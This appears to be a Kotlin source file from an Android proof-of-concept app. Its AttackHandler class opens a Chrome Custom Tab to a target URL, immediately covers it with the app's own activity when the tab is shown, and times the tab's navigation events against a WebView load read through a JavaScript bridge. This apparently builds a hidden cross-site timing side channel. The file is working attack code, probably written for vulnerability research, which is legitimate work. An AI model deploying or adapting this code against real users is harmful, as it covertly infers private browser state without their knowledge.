package com.brokenbridge.poc.ct

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.webkit.JavascriptInterface
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.browser.customtabs.*
import androidx.core.content.ContextCompat.startActivity
import com.brokenbridge.poc.ct.data.NavigationEvent
import com.brokenbridge.poc.ct.ui.main.MainViewModel
import kotlinx.coroutines.runBlocking
import java.time.Duration
import java.time.LocalDateTime

class AttackHandler(
    val context: Context,
    val viewModel: MainViewModel,
    private val webView: WebView) {

    private val myHandler: Handler = Handler(Looper.getMainLooper())

    lateinit var callback: CustomTabsCallback
    lateinit var connection: CustomTabsServiceConnection
    var session: CustomTabsSession? = null

    var startTime: LocalDateTime? = null
    var endTime: LocalDateTime? = null
    var isFailed: Boolean? = null

    private val packageNameChrome = "com.android.chrome"
    private var packageName = packageNameChrome
    var intent: Intent? = null
    private var currentUrl: String = "https://example.com"

    private var webViewLoadingTime: Float? = null

    init {
        setupCustomTab()
        setupWebView()
    }

    private fun setupCustomTab() {
        callback = object : CustomTabsCallback() {
            override fun onNavigationEvent(navigationEvent: Int, extras: Bundle?) {
                when(navigationEvent) {
                    TAB_SHOWN -> {
                        this@AttackHandler.openOverlay()
                    }
                    NAVIGATION_STARTED -> {
                        startTime = LocalDateTime.now()
                        viewModel.addEvent(
                            NavigationEvent(
                            packageName,
                            "NAVIGATION_STARTED",
                            currentUrl
                        )
                        )
                    }
                    NAVIGATION_FINISHED -> {
                        endTime = LocalDateTime.now()
                        if (isFailed == null) {
                            isFailed = false
                        }
                        onLoadingFinished()

                    }
                    NAVIGATION_FAILED -> {
                        isFailed = true
                    }
                    else -> { }
                }
            }
        }

        connection = object : CustomTabsServiceConnection() {
            override fun onCustomTabsServiceConnected(
                    name: ComponentName,
                    client: CustomTabsClient
            ) {
                session = client.newSession(callback)
                client.warmup(0)
            }

            override fun onServiceDisconnected(componentName: ComponentName?) { }
        }
        packageName = packageNameChrome

        CustomTabsClient.bindCustomTabsService(context, packageName, connection)
    }

    private fun setupWebView() {
        WebView.setWebContentsDebuggingEnabled(true);
        webView.addJavascriptInterface(this, "android")
        webView.settings.javaScriptEnabled = true
        webView.webViewClient = WebViewClient()
    }

    fun navigate(intent: Intent) {
        currentUrl = viewModel.url.value?:"https://example.com"
        startTime = null
        endTime = null
        isFailed = null
        this.intent = intent
        val builder: CustomTabsIntent.Builder = CustomTabsIntent.Builder(session)
        val cctIntent: CustomTabsIntent = builder.build()

        loadInWebView()
        cctIntent.launchUrl(context, Uri.parse(currentUrl))
    }

    private fun openOverlay() {
        if (intent != null) {
            startActivity(context, intent!!, null)
        }
    }

    private fun onLoadingFinished() {
        if (isFailed == true) {
            viewModel.addEvent(
                NavigationEvent(
                    packageName,
                    "NAVIGATION_FAILED_AND_FINISHED",
                    currentUrl,
                    Duration.between(startTime, endTime).toMillis()
                )
            )
        } else {
            viewModel.addEvent(
                NavigationEvent(
                    packageName,
                    "NAVIGATION_FINISHED_2XX_3XX",
                    currentUrl,
                    Duration.between(startTime, endTime).toMillis()
                )
            )
        }
    }

    private fun loadInWebView() {
        webViewLoadingTime = null
        webView.loadUrl(currentUrl)
        myHandler.postDelayed({
            webView.loadUrl("javascript:android.postDuration(performance.getEntriesByType('navigation')[0].duration)")
        }, 6000) // hard limit
    }

    /**
     * JavaScript bridge used to receive results about the loading time inside the WebView.
     */
    @JavascriptInterface
    public fun postDuration(duration: String?) {
        runBlocking {
            viewModel.addEvent(
                NavigationEvent(
                    "WebView",
                    "WEBVIEW_LOADED",
                    currentUrl,
                    duration?.toDouble()?.toLong()
                )
            )
        }
    }
}